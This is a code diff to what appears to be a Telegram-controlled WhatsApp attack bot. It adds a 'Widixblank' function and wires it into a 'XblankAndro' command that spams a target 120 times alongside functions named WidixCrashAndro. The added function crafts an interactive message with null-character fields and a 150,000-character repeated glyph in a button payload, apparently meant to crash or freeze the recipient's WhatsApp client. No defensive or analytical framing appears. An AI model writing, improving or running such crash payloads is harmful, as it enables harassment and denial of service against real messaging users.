@@ -3406,7 +3406,7 @@ bot.command("XblankAndro", checkWhatsAppConnection, checkPremium, checkCooldown,
   for (let i = 0; i < 120; i++) {
     await WidixCrashAndro(sock, target);
     await sleep(800);
-    await WidixDelayInvis(sock, target);
+    await Widixblank(sock, target);
     await sleep(1000);
     await WidixCrashAndro(sock, target);
     await sleep(2000);
@@ -3746,6 +3746,43 @@ async function WidixDelayHardddd(sock, target) {
       }
     }, {})
   }
+}
+
+async function Widixblank(sock, target) {
+  try {
+    const msg = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "\u0000",
+              hasMediaAttachment: false
+            },
+            body: {
+              text: "\u0000"
+            },
+            nativeFlowMessage: {
+              buttons: [
+                { 
+                  name: "galaxy_message",
+                  buttonParamsJson: JSON.stringify({
+                    icon: "PROMOTION",
+                    flow_cta: "ꦽ".repeat(150000),
+                    flow_message_version: "3"
+                  })
+                }
+              ]
+            }
+          }
+        }
+      }
+    };
+    await sock.relayMessage(target, msg, {
+      messageId: sock.generateMessageTag(),
+      participant: { jid: target }
+    });
+  } catch (e) {
+  }
 }
 ///========[ END FUN ]=====\\\
 bot.launch()
